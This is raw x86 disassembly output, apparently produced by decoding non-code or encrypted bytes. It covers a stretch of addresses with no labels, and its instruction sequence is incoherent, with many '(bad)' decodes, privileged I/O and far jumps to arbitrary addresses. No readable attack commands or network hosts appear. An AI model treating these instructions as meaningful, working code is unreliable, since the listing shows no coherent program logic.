  417c5b:	mov    edi,ecx
  417c5d:	(bad)  [ebx]
  417c5f:	mov    edx,ecx
  417c61:	xor    eax,0x69218fcd
  417c66:	loope  0x417c38
  417c68:	cwde   
  417c69:	pop    es
  417c6a:	xrelease mov BYTE PTR [ecx-0x75],bh
  417c6e:	rcr    al,1
  417c70:	mov    ecx,0x94dbc7d1
  417c75:	daa    
  417c76:	mov    ds:0x9f9392c6,eax
  417c7b:	adc    BYTE PTR [bx+di],cl
  417c7e:	loope  0x417c9f
  417c80:	xor    edi,esi
  417c82:	sub    DWORD PTR [edi+0x74],eax
  417c85:	shr    BYTE PTR [eax+0x5fa99d3a],0x32
  417c8c:	rcr    DWORD PTR [ecx+0x5a42b052],cl
  417c92:	jl     0x417cd6
  417c94:	adc    al,0xa3
  417c96:	(bad)  [ecx-0x27]
  417c99:	ret    
  417c9a:	sbb    al,0x5f
  417c9c:	ret    0x8b4c
  417c9f:	inc    ecx
  417ca0:	adc    DWORD PTR es:[edx-0x1dc678a4],esp
  417ca7:	mov    ds:0x26aac088,eax
  417cac:	dec    esp
  417cad:	pop    ebx
  417cae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417caf:	arpl   WORD PTR [eax-0x5dd77e1b],si
  417cb5:	das    
  417cb6:	add    eax,0x1604f269
  417cbb:	out    0xa6,eax
  417cbd:	imul   esp,DWORD PTR fs:[esp+ecx*1-0x33065d3e],0xffffffa0
  417cc6:	and    bh,BYTE PTR [ebp+0x53]
  417cc9:	test   BYTE PTR [ecx+0x7d3bab5f],cl
  417ccf:	leave  
  417cd0:	mov    es,WORD PTR [eax-0x7e]
  417cd3:	je     0x417d3c
  417cd5:	mov    al,ds:0x9e5c75ef
  417cda:	pop    esi
  417cdb:	dec    edi
  417cdc:	call   0x60f1:0x9913060f
  417ce3:	clc    
  417ce4:	imul   ebx,DWORD PTR [ebx+edx*1+0x59],0x43b2e522
  417cec:	aam    0x99
  417cee:	inc    esp
  417cef:	sbb    al,BYTE PTR [ebx-0x59]
  417cf2:	cmp    cl,BYTE PTR [ecx+0x8f54c70]
  417cf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cf9:	inc    ebx
  417cfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cfb:	(bad)  
  417cfc:	adc    cl,cl
  417cfe:	and    cl,dl
  417d00:	mov    ecx,0x6ecc52c0
  417d05:	test   BYTE PTR [eax+0x7b905cc5],0x3a
  417d0c:	lods   al,BYTE PTR ds:[esi]
  417d0d:	arpl   WORD PTR [edi],dx
  417d0f:	aam    0x3
  417d11:	pop    esp
  417d12:	dec    edi
  417d13:	xor    DWORD PTR [ebp+0x2],ebp
  417d16:	push   edx
  417d17:	shl    edi,0x9
  417d1a:	adc    esi,eax
  417d1c:	out    dx,al
  417d1d:	cmp    DWORD PTR [eax],edx
  417d1f:	jne    0x417d72
  417d21:	mov    edx,0x30d874d8
  417d26:	imul   BYTE PTR [ebx+0xdd7e74b]
  417d2c:	popf   
  417d2d:	leave  
  417d2e:	test   eax,0x87970fb5
  417d33:	pop    esp
  417d34:	fsubp  st(2),st
  417d36:	or     DWORD PTR [edx],esp
  417d38:	inc    esp
  417d39:	xchg   BYTE PTR [eax+edx*4],dl
  417d3c:	mov    ecx,0xb25a635
  417d41:	icebp  
  417d42:	ja     0x417d31
  417d44:	cli    
  417d45:	inc    esi
  417d46:	(bad)  
  417d47:	int3   
  417d48:	iret   
  417d49:	sub    bh,ch
  417d4b:	cld    
  417d4c:	lea    ebx,[edi+ebx*1-0x6ca2a442]
  417d53:	push   edi
  417d54:	fisttp DWORD PTR [ebp-0x5c7a29cb]
  417d5a:	mov    ch,0xf7
  417d5c:	fst    DWORD PTR [esi+0x7017f2e6]
  417d62:	and    dl,BYTE PTR gs:[eax+0x4a8cceb7]
  417d69:	fcmovnu st,st(7)
  417d6b:	addr16 mov ds:0x95c7,eax
  417d6f:	cs and eax,0xf750f8c5
  417d75:	std    
  417d76:	inc    eax
  417d77:	test   DWORD PTR [esi+0x72796e93],esp
  417d7d:	xchg   DWORD PTR [ebp-0x1d],ebx
  417d80:	mov    ch,0x53
  417d82:	arpl   WORD PTR [ecx+0x624d9374],si
  417d88:	and    DWORD PTR [edx-0x2ec384a6],0xffffffc6
  417d8f:	push   ebx
  417d90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d91:	dec    ecx
  417d92:	adc    BYTE PTR [esi],dl
  417d94:	dec    ebp
  417d95:	fstp   TBYTE PTR [edi]
  417d97:	out    0x2,eax
  417d99:	mov    eax,0xf3326428
  417d9e:	add    al,0x72
  417da0:	inc    esi
  417da1:	pop    ss
  417da2:	xlat   BYTE PTR ds:[ebx]
  417da3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417da4:	cmp    al,0x1e
  417da6:	inc    edi
  417da7:	ret    
  417da8:	popf   
  417da9:	loope  0x417dbc
  417dab:	stc    
  417dac:	test   DWORD PTR [ecx+ebp*2+0x68975b6d],ebx
  417db3:	(bad)  
  417db4:	stos   BYTE PTR es:[edi],al
  417db5:	push   eax
  417db6:	xor    DWORD PTR [ebx-0x76],0x32
  417dba:	pop    eax
  417dbb:	call   0xc80ad9e0
  417dc0:	(bad)  
  417dc1:	xchg   cl,bl
  417dc3:	mov    esi,?
  417dc5:	(bad)  
  417dc6:	fsub   QWORD PTR [ebx*2-0x1642c3fc]
  417dcd:	inc    edx
  417dce:	sti    
  417dcf:	les    esp,FWORD PTR [ebx]
  417dd1:	and    DWORD PTR ds:0x4d81daf4,ebp
  417dd7:	scas   al,BYTE PTR es:[edi]
  417dd8:	sub    ecx,esp
  417dda:	fidivr WORD PTR [ebx+eax*8]
  417ddd:	xor    al,0x2f
  417ddf:	mov    ebx,0x4831d9b0
  417de4:	stos   BYTE PTR es:[edi],al
  417de5:	xor    DWORD PTR [esi+0x19],esp
  417de8:	push   es
  417de9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dea:	(bad)
  417dee:	scas   eax,DWORD PTR es:[edi]
  417def:	mov    ah,0xae
  417df1:	mov    ds:0xeedb5c83,eax
  417df6:	into   
  417df7:	inc    ebx
  417df8:	lods   eax,DWORD PTR ds:[esi]
  417df9:	or     al,BYTE PTR [ecx-0xf]
  417dfc:	addr16 js 0x417e1b
  417dff:	jnp    0x417e12
  417e01:	shl    BYTE PTR [ebx+0x37],1
  417e04:	push   edi
  417e05:	xor    BYTE PTR [eax+edx*1+0x27],0xd1
  417e0a:	inc    ecx
  417e0b:	mov    edi,0x3bb1cc35
  417e10:	inc    ebx
  417e11:	in     eax,0x77
  417e13:	fbstp  TBYTE PTR [eax-0x591342f4]
  417e19:	mov    dl,0x72
  417e1b:	jo     0x417e91
  417e1d:	mov    esi,0x58eb5de
  417e22:	mov    ch,0x64
  417e24:	xchg   esi,eax
  417e25:	xchg   edi,eax
  417e26:	pop    esi
  417e27:	lods   al,BYTE PTR ds:[esi]
  417e28:	cs push edx
  417e2a:	xor    edi,DWORD PTR [ebx+0x15]
  417e2d:	push   edx
  417e2e:	sub    DWORD PTR [esi-0x3ad21ecf],0x2e997d7b
  417e38:	popf   
  417e39:	shr    DWORD PTR [ecx-0x3a],cl
  417e3c:	in     eax,dx
  417e3d:	vaddsubps ymm5,ymm6,ymm5
  417e41:	int    0xe4
  417e43:	mov    BYTE PTR [ecx],dh
  417e45:	adc    eax,0xe0bd20
  417e4a:	sahf   
  417e4b:	xchg   ecx,eax
  417e4c:	std    
  417e4d:	int3   
  417e4e:	xlat   BYTE PTR ds:[ebx]
  417e4f:	iret   
  417e50:	imul   ebx,esp,0xd66177ac
  417e56:	jl     0x417dea
  417e58:	repnz pop ebp
  417e5a:	mov    ecx,0x5626098d
  417e5f:	sub    eax,0x6c035340
  417e64:	fisub  DWORD PTR ds:0xbdd25ff6
  417e6a:	lods   al,BYTE PTR ds:[esi]
  417e6b:	sub    edx,DWORD PTR [ecx]
  417e6d:	loop   0x417e85
  417e6f:	sub    eax,0xc4d3dbc3
  417e74:	jecxz  0x417e51
  417e76:	sahf   
  417e77:	ud1    ebx,DWORD PTR [ecx]
  417e7a:	inc    esi
  417e7b:	cs test al,0x85
  417e7e:	xchg   ebp,eax
  417e7f:	cmp    eax,0x39d7ad2e
  417e84:	mov    ?,WORD PTR [edi]
  417e86:	xchg   esp,eax
  417e87:	push   esp
  417e88:	sahf   
  417e89:	stos   BYTE PTR es:[edi],al
  417e8a:	sti    
  417e8b:	out    0x63,al
  417e8d:	scas   al,BYTE PTR es:[edi]
  417e8e:	mov    esi,0x69e2f159
  417e93:	mov    WORD PTR [eax+0x57],?
  417e96:	pop    ds
  417e97:	and    BYTE PTR [ecx],al
  417e99:	stos   BYTE PTR es:[edi],al
  417e9a:	sti    
  417e9b:	rcl    BYTE PTR [esi-0x6564eca3],cl
  417ea1:	aaa    
  417ea2:	dec    edx
  417ea3:	or     edi,DWORD PTR ds:0xa146ecc
  417ea9:	dec    ebp
  417eaa:	push   ss
  417eab:	ds pop ebx
  417ead:	xchg   DWORD PTR [ebx-0x63],eax
  417eb0:	mov    ah,0x89
  417eb2:	in     al,dx
  417eb3:	jmp    0x7c37e7d7
  417eb8:	xor    eax,0xb6c3b6ec
  417ebd:	clc    
  417ebe:	mov    dh,0x24
  417ec0:	shr    DWORD PTR [eax-0x69628543],1
  417ec6:	add    DWORD PTR [ebp-0x15fde6a9],0xffffff88
  417ecd:	push   ebx
  417ece:	repnz and eax,0x7b784ae4
  417ed4:	outs   dx,BYTE PTR ds:[esi]
  417ed5:	fisub  WORD PTR [esi]
  417ed7:	leave  
  417ed8:	hlt    
  417ed9:	div    bh
  417edb:	test   al,0x48
  417edd:	dec    DWORD PTR [eax+edx*4-0xd]
  417ee1:	aad    0xb1
  417ee3:	out    0x14,al
  417ee5:	push   ss
  417ee6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ee7:	push   ds
  417ee8:	xchg   ebp,eax
  417ee9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417eea:	cdq    
  417eeb:	cli    
  417eec:	shl    BYTE PTR [esi+0x4e286a4d],1
  417ef2:	shl    ah,cl
  417ef4:	mov    al,ds:0x585a0eb2
  417ef9:	out    0x81,al
  417efb:	aad    0xfc
  417efd:	shr    BYTE PTR [esi],0xbe
  417f00:	loopne 0x417ebb
  417f02:	(bad)  
  417f03:	or     ebp,ebp
  417f05:	call   0x800f:0x93dec5f0
  417f0c:	mov    bh,0x92
  417f0e:	(bad)  
  417f10:	out    0x3b,al
  417f12:	loopne 0x417f03
  417f14:	test   al,0xc6
  417f16:	pop    edi
  417f17:	cmp    BYTE PTR [ebp+0x71],bl
  417f1a:	mov    edi,0xa4e8f43e
  417f1f:	gs cmc 
  417f21:	jmp    0xb1c0f6f8
  417f26:	pop    DWORD PTR [eax+ebp*4+0x1f148877]
  417f2d:	call   0x3cb3:0xd42c8811
  417f34:	inc    esi
  417f35:	push   eax
  417f36:	mov    esp,0x82a1728e
  417f3b:	sbb    BYTE PTR [edx+0x5f45babc],cl
  417f41:	sub    eax,0x199c404a
  417f46:	mov    fs,ecx
  417f48:	icebp  
  417f49:	out    0xcf,al
  417f4b:	es (bad) 
  417f4d:	jle    0x417ef9
  417f4f:	or     ch,dh
  417f51:	mov    ecx,0x4c560fa8
  417f56:	add    ebp,edi
  417f58:	in     al,dx
  417f59:	inc    edx
  417f5a:	sbb    eax,0x804699bd
  417f5f:	xchg   ecx,eax
  417f60:	push   ds
  417f61:	fdiv   st,st(5)
  417f63:	sbb    al,0x2c
  417f65:	pop    eax
  417f66:	or     edi,DWORD PTR [eax-0x2d766c79]
  417f6c:	pushf  
  417f6d:	cmp    al,0xe3
  417f6f:	ins    DWORD PTR es:[edi],dx
  417f70:	pusha  
  417f71:	imul   edx,DWORD PTR [ebp+0x78],0x99eab495
  417f78:	inc    eax
  417f79:	mov    al,BYTE PTR [ecx+0x7a088807]
  417f7f:	out    dx,eax
  417f80:	into   
  417f81:	inc    esi
  417f82:	loop   0x417f86
  417f84:	sub    al,0x42
  417f86:	or     ch,BYTE PTR [ebp+0x2800a2f1]
  417f8c:	jmp    0x417f59
  417f8e:	stos   BYTE PTR es:[edi],al
  417f8f:	inc    edi
  417f90:	mov    ?,WORD PTR [eax]
  417f92:	cmp    eax,esi
  417f94:	and    ecx,esi
  417f96:	jp     0x417fed
  417f98:	and    DWORD PTR [edx+0x39080aca],ecx
  417f9e:	in     eax,dx
  417f9f:	sbb    dh,BYTE PTR [edi-0x7]
  417fa2:	icebp  
  417fa3:	or     BYTE PTR [bx+di],bh
  417fa6:	adc    DWORD PTR [edx],edx
  417fa8:	sbb    DWORD PTR [ecx+0x53],ebx
  417fab:	cdq    
  417fac:	jge    0x417fd4
  417fae:	test   BYTE PTR [ebp-0x27],0x21
  417fb2:	push   es
  417fb3:	xchg   edx,eax
  417fb4:	test   BYTE PTR [eax+eiz*8],dh
  417fb7:	sub    BYTE PTR [edi-0x25],cl
  417fba:	jmp    0x1fa43ea1
  417fbf:	stos   DWORD PTR es:[edi],eax
  417fc0:	mov    DWORD PTR [esi-0x1],edi
  417fc3:	std    
  417fc4:	cmp    DWORD PTR [ebx-0x3f],ebp
  417fc7:	mov    edi,0x299918f4
  417fcc:	push   ecx
  417fcd:	scas   al,BYTE PTR es:[edi]
  417fce:	jno    0x417f5d
  417fd0:	and    DWORD PTR [edi+0x308aa135],ecx
  417fd6:	sbb    eax,DWORD PTR [eax+0x5233142f]
  417fdc:	mov    bl,0x81
  417fde:	jns    0x417fdd
  417fe0:	mov    dl,0x93
  417fe2:	lahf   
  417fe3:	mov    bh,0x3
  417fe5:	inc    eax
  417fe6:	test   BYTE PTR [edi-0x75],0x45
  417fea:	repnz dec ecx
  417fec:	ds imul edi
  417fef:	fcomp  DWORD PTR [edx*2+0x154ad538]
  417ff6:	dec    edi
  417ff7:	retf   
  417ff8:	in     al,dx
  417ff9:	shl    DWORD PTR [edx+eiz*1-0x512a51e7],0x25
  418001:	out    0x3d,eax
  418003:	push   edx
  418004:	test   al,al
  418006:	out    dx,eax
  418007:	jge    0x417fff
  418009:	dec    DWORD PTR [ebp-0x46bdab16]
  41800f:	mov    ebp,0xff093d06
  418014:	or     bh,bl
  418016:	cmp    al,0x45
  418018:	std    
  418019:	fmul   DWORD PTR [ecx]
  41801b:	cmp    ah,BYTE PTR [esi]
  41801d:	and    bl,0xc9
  418020:	jmp    0x4e4296df
  418025:	mov    ch,0x17
  418027:	dec    ebx
  418028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418029:	(bad)  
  41802a:	xchg   DWORD PTR [ebp+edi*4-0x64],ebp
  41802e:	gs rcr al,0x89
  418032:	dec    ebx
  418033:	or     BYTE PTR [edi-0x2896a77e],cl
  418039:	fwait
  41803a:	xchg   DWORD PTR [esi-0xf1abfad],ecx
  418040:	pop    ecx
  418041:	arpl   cx,bp
  418043:	cmp    eax,0x349838e6
  418048:	sbb    dl,0xf5
  41804b:	jnp    0x418000
  41804d:	dec    ecx
  41804e:	push   edi
  41804f:	test   al,0x21
  418051:	jo     0x418096
  418053:	push   0x58
  418055:	pushf  
  418056:	imul   ebp,DWORD PTR [edx-0x5a],0xfffffffd
  41805a:	mov    ds:0xdd448faa,eax
  41805f:	push   ebx
  418060:	jbe    0x4180d6
  418062:	imul   ecx,ebp,0x3a
  418065:	sti    
  418066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418067:	dec    edi
  418068:	mov    esp,0xd99821f7
  41806d:	jbe    0x418040
  41806f:	mov    WORD PTR [ecx],gs
  418071:	mov    edi,0xed200ae0
  418076:	dec    di
  418078:	push   ss
  418079:	fbld   TBYTE PTR [edx]
  41807b:	aad    0xb3
  41807d:	sbb    dl,dh
  41807f:	lods   al,BYTE PTR ds:[esi]
  418080:	int3   
  418081:	les    edx,FWORD PTR [esi+0x608bf9ef]
  418087:	clc    
  418088:	loopne 0x418072
  41808a:	mov    ds:0x4a1911c7,al
  41808f:	loop   0x4180a6
  418091:	stc    
  418092:	test   al,0x43
  418094:	jns    0x418063
  418096:	sbb    DWORD PTR [eax-0x20],ecx
  418099:	cmp    esp,esp
  41809b:	ins    DWORD PTR es:[edi],dx
  41809c:	cmp    ah,BYTE PTR [ebp+0x41]
  41809f:	es jmp 0x464cf1e5
  4180a5:	bound  edi,QWORD PTR [edx+0x37]
  4180a8:	adc    BYTE PTR [eax],dh
  4180aa:	sbb    DWORD PTR [esp+ebp*8],ebp
  4180ad:	repnz int 0xb4
  4180b0:	sbb    BYTE PTR [eax],al
  4180b2:	sbb    al,0xa9
  4180b4:	sbb    esp,DWORD PTR ds:0xdab70571
  4180ba:	sti    
  4180bb:	push   esp
  4180bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180bd:	jmp    0x8156:0xf70cab9f
  4180c4:	push   esi
  4180c5:	pop    es
  4180c6:	mov    eax,ds:0x41d3638e
  4180cb:	rcl    DWORD PTR [ebx+0x58805ac3],cl
  4180d1:	lds    edi,FWORD PTR [ecx-0x2a]
  4180d4:	inc    ecx
  4180d5:	or     al,0x7c
  4180d7:	sub    ebp,DWORD PTR [edi+ebp*4+0x6e]
  4180db:	(bad)  
  4180dc:	and    eax,0x96f5fea
  4180e1:	mov    edi,edx
  4180e3:	dec    esi
  4180e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180e5:	div    ch
  4180e7:	out    dx,eax
  4180e8:	push   ebp
  4180e9:	mov    ah,0x71
  4180eb:	fild   DWORD PTR [ebp-0x35]
  4180ee:	dec    edx
  4180ef:	adc    BYTE PTR [esi+0x6],bl
  4180f2:	in     eax,0x2d
  4180f4:	stc    
  4180f5:	nop
  4180f6:	fs sub eax,0x2154d458
  4180fc:	out    0x44,eax
  4180fe:	inc    edx
  4180ff:	jmp    0xe3e4:0x4d49cd4b
  418106:	rcl    DWORD PTR [edi+eiz*8-0x47022241],cl
  41810d:	adc    eax,0x7d65f78d
  418112:	inc    ebp
  418113:	mov    eax,ds:0x9e004c36
  418118:	push   cs
  418119:	cwde   
  41811a:	loop   0x418156
  41811c:	mov    bl,BYTE PTR [ecx]
  41811e:	in     al,0x44
  418120:	out    dx,al
  418121:	xchg   edx,eax
  418122:	cwde   
  418123:	mov    ah,0x8b
  418125:	and    edi,DWORD PTR [ebp+0x18]
  418128:	pushf  
  418129:	or     ecx,ebp
  41812b:	cli    
  41812c:	mov    BYTE PTR [ebx-0x31],bl
  41812f:	mov    dl,0xbf
  418131:	mov    ch,0xb3
  418133:	mov    esp,0x582219e7
  418138:	add    DWORD PTR [ecx-0x59],edx
  41813b:	jno    0x418159
  41813d:	mov    dl,0x9c
  41813f:	lock add al,0x28
  418142:	les    ecx,FWORD PTR ds:0x3cdc25a2
  418148:	and    DWORD PTR [eax+eax*8-0x77],eax
  41814c:	mov    WORD PTR [ebx+0x5947bb0e],?
  418152:	imul   ebp,DWORD PTR [esi+ebx*8+0x10],0x57
  418157:	push   ebx
  418158:	xchg   ah,al
  41815a:	push   cs
  41815b:	dec    ecx
  41815c:	or     al,0x51
  41815e:	pop    ebp
  41815f:	ret    
  418160:	or     DWORD PTR [eax-0x45ba2708],0x7534c81
  41816a:	es je  0x4181af
  41816d:	mov    esi,0x58f81e89
  418172:	push   cs
  418173:	fimul  DWORD PTR [esi+0x34]
  418176:	push   ebp
  418177:	call   0xc3484f36
  41817c:	pop    ds
  41817d:	and    eax,0x1f704c8d
  418182:	pusha  
  418183:	in     eax,dx
  418184:	pop    esi
  418185:	or     al,0xd5
  418187:	loope  0x418182
  418189:	add    BYTE PTR [esi-0x6c9482ac],dl
  41818f:	loopne 0x418133
  418191:	pop    eax
  418192:	aaa    
  418193:	inc    eax
  418194:	xchg   ebx,eax
  418195:	ror    dl,0x58
  418198:	dec    eax
  418199:	js     0x418143
  41819b:	xchg   ebx,eax
  41819c:	sbb    BYTE PTR [ebp+0x316c3a1e],ah
  4181a2:	lahf   
  4181a3:	bnd jo 0x418152
  4181a6:	mov    ah,0xa
  4181a8:	push   DWORD PTR [ebp-0x56]
  4181ab:	out    0x47,eax
  4181ad:	dec    eax
  4181ae:	mov    WORD PTR [ebx+0x71e660be],es
  4181b4:	outs   dx,DWORD PTR ds:[esi]
  4181b5:	ds pop ss
  4181b7:	ins    BYTE PTR es:[edi],dx
  4181b8:	iret   
  4181b9:	data16 jo 0x418167
  4181bc:	cmp    BYTE PTR [ecx-0x2],bh
  4181bf:	das    
  4181c0:	mov    ds:0xfd7772af,eax
  4181c5:	fucomp st(4)
  4181c7:	add    al,0x46
  4181c9:	mov    cl,0xf1
  4181cb:	jl     0x4181d3
  4181cd:	pop    esp
  4181ce:	aas    
  4181cf:	pop    ss
  4181d0:	xor    BYTE PTR [edi+edi*2-0x64204cfe],al
  4181d7:	xor    BYTE PTR [ecx],ch
  4181d9:	jp     0x418225
  4181db:	repnz cld 
  4181dd:	inc    eax
  4181de:	jo     0x4181af
  4181e0:	fcmovbe st,st(7)
  4181e2:	ret    0xaf6b
  4181e5:	lahf   
  4181e6:	scas   eax,DWORD PTR es:[edi]
  4181e7:	fwait
  4181e8:	shl    DWORD PTR [edx-0x74dda5ad],1
  4181ee:	dec    ecx
  4181ef:	pop    edi
  4181f0:	jle    0x4181de
  4181f2:	in     al,dx
  4181f3:	ins    DWORD PTR es:[edi],dx
  4181f4:	out    0x90,eax
  4181f6:	pop    ds
  4181f7:	outs   dx,BYTE PTR ds:[esi]
  4181f8:	mov    WORD PTR [ebp-0x5dfe6dd0],?
  4181fe:	pop    ebp
  4181ff:	jnp    0x41824e
  418201:	mov    ebx,0xfefa0fc5
  418206:	add    BYTE PTR [edx-0x46],dh
  418209:	stos   BYTE PTR es:[edi],al
  41820a:	jo     0x418226
  41820c:	and    BYTE PTR [ebp+0x16],bh
  41820f:	and    BYTE PTR [ecx-0x231437b2],cl
  418215:	push   edx
  418216:	fisttp WORD PTR [ecx+ebx*2-0x3c]
  41821a:	inc    esi
  41821b:	stos   BYTE PTR es:[edi],al
  41821c:	cli    
  41821d:	aam    0x89
  41821f:	push   es
  418220:	shl    BYTE PTR [ecx-0x5],0xd8
  418224:	daa    
  418225:	mov    ebx,0x714fa9de
  41822a:	sbb    BYTE PTR [ebx],0xbe
  41822d:	xor    bl,BYTE PTR [edx+0x79]
  418230:	ins    BYTE PTR es:[edi],dx
  418231:	xor    cl,BYTE PTR [eax+0x3a463853]
  418237:	xchg   DWORD PTR [ecx+0x136ce5f],edi
  41823d:	or     al,0x9
  41823f:	jge    0x41820e
  418241:	cmp    esi,DWORD PTR [edi+esi*2-0x32]
  418245:	pop    edi
  418246:	push   ecx
  418247:	into   
  418248:	and    al,0xef
  41824a:	jmp    0x418232
  41824c:	cld    
  41824d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41824e:	xchg   ecx,eax
  41824f:	test   eax,0x989031f5
  418254:	cli    
  418255:	mov    cl,0x51
  418257:	sub    BYTE PTR [ebx],dh
  418259:	xor    DWORD PTR [edx],esp
  41825b:	shl    BYTE PTR ds:0x29c3ab9b,cl
  418261:	ret    
  418262:	pop    edx
  418263:	inc    esp
  418264:	iret   
  418265:	lods   al,BYTE PTR ds:[esi]
  418266:	or     BYTE PTR [edi],0xff
  418269:	call   0x6e480fa4
  41826e:	pop    es
  41826f:	sbb    esp,DWORD PTR [esi-0x58809c93]
  418275:	stos   DWORD PTR es:[edi],eax
  418276:	mov    bh,0x6c
  418278:	rol    DWORD PTR [ecx+ebx*8],cl
  41827b:	and    dl,BYTE PTR [edi+0x3e5829b0]
  418281:	div    DWORD PTR [eax+0x6c075849]
  418287:	pop    edx
  418288:	cld    
  418289:	push   esi
  41828a:	inc    ebp
  41828b:	cmp    al,0x7e
  41828d:	mov    ecx,0xd656b165
  418292:	in     al,0x6
  418294:	std    
  418295:	dec    ecx
  418296:	shr    DWORD PTR [eax+eax*4],cl
  418299:	out    0xad,eax
  41829b:	xor    al,0xd
  41829d:	jmp    0xd0a8:0xef707011
  4182a4:	lods   al,BYTE PTR ds:[esi]
  4182a5:	ins    BYTE PTR es:[edi],dx
  4182a6:	arpl   WORD PTR [ebx+edx*1-0xb0c3557],dx
  4182ad:	mov    esp,0x7f02c881
  4182b2:	in     eax,dx
  4182b3:	icebp  
  4182b4:	shl    DWORD PTR [ebx],0xaf
  4182b7:	or     al,0x37
  4182b9:	adc    BYTE PTR [eax+0x4],ch
  4182bc:	mov    edx,0xb56dd989
  4182c1:	mov    eax,ds
  4182c3:	aaa    
  4182c4:	repnz lds ebx,FWORD PTR [ecx+0x64]
  4182c8:	jo     0x418348
  4182ca:	lahf   
  4182cb:	shl    BYTE PTR [edi+eax*4-0x32],0xd2
  4182d0:	adc    DWORD PTR [ebx+esi*8],eax
  4182d3:	cmp    eax,0xc735ef60
  4182d8:	stos   DWORD PTR es:[edi],eax
  4182d9:	js     0x418285
  4182db:	shl    DWORD PTR [ebx+0x5b1160d],0xa
  4182e2:	xor    al,0x80
  4182e4:	cmp    edi,ebx
  4182e6:	arpl   WORD PTR [ebp-0x5],di
  4182e9:	mov    bl,0x92
  4182eb:	ss dec di
  4182ee:	xchg   esi,eax
  4182ef:	int3   
  4182f0:	xchg   ecx,eax
  4182f1:	out    0x28,al
  4182f3:	in     al,dx
  4182f4:	mov    ch,0x6b
  4182f6:	sub    ah,BYTE PTR [edi]
  4182f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182f9:	push   esi
  4182fa:	sbb    BYTE PTR ds:0x277c6458,0x2
  418301:	cmp    DWORD PTR [esi-0x61],esi
  418304:	jecxz  0x41834d
  418306:	lds    ebx,FWORD PTR [edx+0x4f4e08d0]
  41830c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41830d:	sar    eax,0x58
  418310:	aas    
  418311:	or     eax,0x3e74df4d
  418316:	test   al,0xd3
  418318:	shl    esp,1
  41831a:	cwde   
  41831b:	mov    dl,0xa
  41831d:	fsub   DWORD PTR [eax-0x37]
  418320:	(bad)  
  418321:	ja     0x418303
  418323:	adc    edx,ebp
  418325:	jl     0x418322
  418327:	add    ebp,DWORD PTR [edi+0x21]
  41832a:	fdiv   st(1),st
  41832c:	fs cmp al,0x87
  41832f:	xchg   esp,eax
  418330:	mov    al,0x9
  418332:	pop    ebp
  418333:	mov    al,ds:0x610be98c
  418338:	mov    eax,ds:0x768043f
  41833d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41833e:	scas   eax,DWORD PTR es:[edi]
  41833f:	test   eax,0x5a19155e
  418344:	fwait
  418345:	jnp    0x4183c5
  418347:	icebp  
  418348:	pop    edx
  418349:	test   al,0x86
  41834b:	imul   edx,ecx,0x607b3b24
  418351:	push   esp
  418352:	mov    cl,0x15
  418354:	mov    al,ds:0xb77ae1fd
  418359:	lods   al,BYTE PTR gs:[esi]
  41835b:	hlt    
  41835c:	fld    TBYTE PTR [eax+edi*4+0x79]
  418360:	xor    al,0xac
  418362:	cmp    eax,0xe48ebc9d
  418367:	lock xacquire xor DWORD PTR [edx],ecx
  41836b:	mov    esp,0xdcc91a3
  418370:	mov    esp,0x1c157962
  418375:	cld    
  418376:	or     al,0xf7
  418378:	out    dx,al
  418379:	mov    eax,0xedf9b694
  41837e:	or     bl,BYTE PTR [eax]
  418380:	pop    ds
  418381:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418382:	jp     0x418351
  418384:	rcl    DWORD PTR [ebp-0x29],0x41
  418388:	sbb    ch,dl
  41838a:	jecxz  0x4183ca
  41838c:	or     esp,DWORD PTR [esp+ebp*2-0x1b]
  418390:	jg     0x41836c
  418392:	aas    
  418393:	xor    DWORD PTR [ebp-0x9f6322f],edx
  418399:	(bad)  
  41839a:	adc    edi,DWORD PTR [ebp+0x2]
  41839d:	add    al,0x56
  41839f:	xlat   BYTE PTR ds:[ebx]
  4183a0:	call   0x253d69ce
  4183a5:	cmp    DWORD PTR [edi],edi
  4183a7:	out    0x91,al
  4183a9:	push   ebp
  4183aa:	push   es
  4183ab:	test   eax,0xc7e37f02
  4183b0:	retf   
  4183b1:	shr    BYTE PTR [eax+0x7c214d18],cl
  4183b7:	and    DWORD PTR [edi-0x5c],edi
  4183ba:	adc    dl,ch
  4183bc:	ss jmp 0x418388
  4183bf:	ficomp WORD PTR [esi]
  4183c1:	mov    eax,0x4e2bcd07
  4183c6:	push   edi
  4183c7:	push   ds
  4183c8:	push   es
  4183c9:	stos   BYTE PTR es:[edi],al
  4183ca:	pop    ss
  4183cb:	loope  0x418364
  4183cd:	pop    esp
  4183ce:	sbb    eax,0xab0ee232
  4183d3:	mov    dl,0xf2
  4183d5:	dec    edi
  4183d6:	lods   al,BYTE PTR ds:[esi]
  4183d7:	loopne 0x4183f0
  4183d9:	popa   
  4183da:	mov    edi,fs
  4183dc:	mov    dh,0x7c
  4183de:	adc    al,0xaf
  4183e0:	ret    0xf0fe
  4183e3:	je     0x418372
  4183e5:	das    
  4183e6:	outs   dx,DWORD PTR ds:[esi]
  4183e7:	dec    ebx
  4183e9:	push   0xc0d48e1c
  4183ee:	push   edx
  4183ef:	bound  cx,DWORD PTR [esi+0x40711c74]
  4183f6:	mov    esp,0x1f2c2d4b
  4183fb:	aas    
  4183fc:	enter  0xbf1a,0x1b
  418400:	or     al,0xb5
  418402:	fwait
  418403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418404:	enter  0xf164,0x32
  418408:	enter  0x86b2,0x79
  41840c:	xor    edi,eax
  41840e:	xchg   BYTE PTR [ecx-0x6015a593],dh
  418414:	out    0xc9,al
  418416:	inc    edx
